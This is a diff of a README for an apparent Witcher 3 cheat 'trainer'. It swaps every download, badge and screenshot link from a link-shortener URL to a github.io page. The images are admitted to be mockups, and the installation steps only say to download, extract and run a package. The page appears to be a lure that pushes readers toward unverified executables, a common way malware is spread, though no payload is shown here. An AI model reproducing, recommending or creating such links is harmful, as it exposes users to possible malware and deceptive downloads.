@@ -4,26 +4,26 @@
 
 ## Quick Access
 
-[![Witcher 3](https://img.shields.io/badge/The%20Witcher%203-Next--Gen-bf3d36?style=for-the-badge)](https://flyn.co/bEkmIo/)
-[![Trainer](https://img.shields.io/badge/Trainer-Windows-d4a84a?style=for-the-badge)](https://flyn.co/bEkmIo/)
-[![Gameplay Utility](https://img.shields.io/badge/Gameplay-Utility-1f7a43?style=for-the-badge)](https://flyn.co/bEkmIo/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-bf3d36?style=for-the-badge)](https://flyn.co/bEkmIo/)
+[![Witcher 3](https://img.shields.io/badge/The%20Witcher%203-Next--Gen-bf3d36?style=for-the-badge)](https://trainedhierar.github.io/)
+[![Trainer](https://img.shields.io/badge/Trainer-Windows-d4a84a?style=for-the-badge)](https://trainedhierar.github.io/)
+[![Gameplay Utility](https://img.shields.io/badge/Gameplay-Utility-1f7a43?style=for-the-badge)](https://trainedhierar.github.io/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-bf3d36?style=for-the-badge)](https://trainedhierar.github.io/)
 
 ## Download
 
-➡️ **[Download The Witcher 3 Utility](https://flyn.co/bEkmIo/)**
+➡️ **[Download The Witcher 3 Utility](https://trainedhierar.github.io/)**
 
 ## Preview
 
-[![Witcher 3 Preview](assets/witcher-3-trainer-preview.png)](https://flyn.co/bEkmIo/)
+[![Witcher 3 Preview](assets/witcher-3-trainer-preview.png)](https://trainedhierar.github.io/)
 
 ### Dashboard
 
-[![Witcher 3 Dashboard](assets/witcher-3-dashboard.png)](https://flyn.co/bEkmIo/)
+[![Witcher 3 Dashboard](assets/witcher-3-dashboard.png)](https://trainedhierar.github.io/)
 
 ### Feature Overview
 
-[![Witcher 3 Features](assets/witcher-3-features.png)](https://flyn.co/bEkmIo/)
+[![Witcher 3 Features](assets/witcher-3-features.png)](https://trainedhierar.github.io/)
 
 > Images above are project interface mockups.
 
@@ -94,7 +94,7 @@ Profiles can store enabled modules, hotkeys, quick actions and favorite settings
 
 ## Installation
 
-1. **[Download Latest Version](https://flyn.co/bEkmIo/)**
+1. **[Download Latest Version](https://trainedhierar.github.io/)**
 2. Extract the package into a dedicated folder.
 3. Launch **The Witcher 3** on Windows.
 4. Start the trainer-style utility.
